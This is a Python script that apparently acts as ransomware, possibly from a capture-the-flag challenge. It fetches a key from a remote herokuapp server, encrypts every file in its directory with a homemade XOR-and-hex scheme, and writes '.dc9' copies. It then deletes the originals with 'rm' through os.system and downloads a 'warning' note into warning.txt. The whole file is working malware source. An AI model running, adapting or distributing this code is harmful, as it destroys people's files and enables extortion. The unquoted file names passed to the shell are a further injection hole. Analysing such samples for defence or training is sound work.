import os
from binascii import hexlify as lock
from binascii import unhexlify as unlock
import requests
import sys
from base64 import b64encode as encc

def get_key():
	getkey = requests.get("https://th1s-is-4-f4ke-fl4g.herokuapp.com/enckey", headers={'User-agent':'0xdc9'})
	return str(getkey.text)

# ENC DEC
def encrypt(plain, key):
	iterate = 0
	a = int(lock(lock(lock(key.encode('utf-8')))))
	b = plain
	b = int(lock(lock(b.encode('utf-8'))))
	while len(str(key)) > iterate:
		b = int(lock(str(b).encode('utf-8') )) ^ a
		iterate += 1

	return b

# get list dir
def getdir_path():
	path = os.path.dirname(__file__)
	out = ""
	file_name = ""
	if len(path) == 0:
		path = os.getcwd()
		listi = os.listdir(path)
		for x in range(0, len(listi)):
			if os.path.isdir(path+'/'+listi[x]) == False:
				out += str(path+'/'+listi[x]+'\n')
				file_name += listi[x]+'\n'

	else:
	#print(path)
		listi = os.listdir(path)
		for x in range(0, len(listi)):
			if os.path.isdir(path+'/'+listi[x]) == False:
				out += str(path+'/'+listi[x]+'\n')
				file_name += listi[x]+'\n'

	return out, file_name

# open dir in file
def end_game(path, ext):
	key = get_key()
	#print(key)
	a = path.split('\n')
	file = ext.split('\n')
	del(a[len(a)-1])
	del(file[len(file)-1])
	#print(a)
	#print(file)
	script_name = sys.argv[0]
	script_name = script_name.replace('./', '')
	for x in range(0, len(a)):
		#print("fucking value: " + script_name)
		#print(script_name)
		if script_name not in file[x] or 'loader' not in file[x] or 'dinined' in file[x]:
			print(f"[+] Encrypting {a[x]}")
			with open(a[x], "rb") as f:
				c = f.read()
				try:
					dead = encrypt(c.decode('utf-8'), key)
					with open(file[x]+".dc9", "w") as gg:
						gg.write(str(dead))
						gg.close()
						os.system(f"rm {file[x]}")

					#print(type(dead))
				except:
					parse = encc(c)
					#print(parse)
					dead = encrypt(parse.decode('utf-8'), key)
					#print(type(dead))
					with open(file[x]+".dc9", "w") as gg:
						gg.write(str(dead))
						gg.close()
						os.system(f"rm {file[x]}")

	warning = requests.get("https://th1s-is-4-f4ke-fl4g.herokuapp.com/warning", headers={'User-agent':'0xdc9'})
	with open("warning.txt", "w") as d:
		d.write(str(warning.text))
		d.close()

def main():
	a,file = getdir_path()
	#print(a)
	end_game(a, file)

if __name__ == '__main__':
	main()

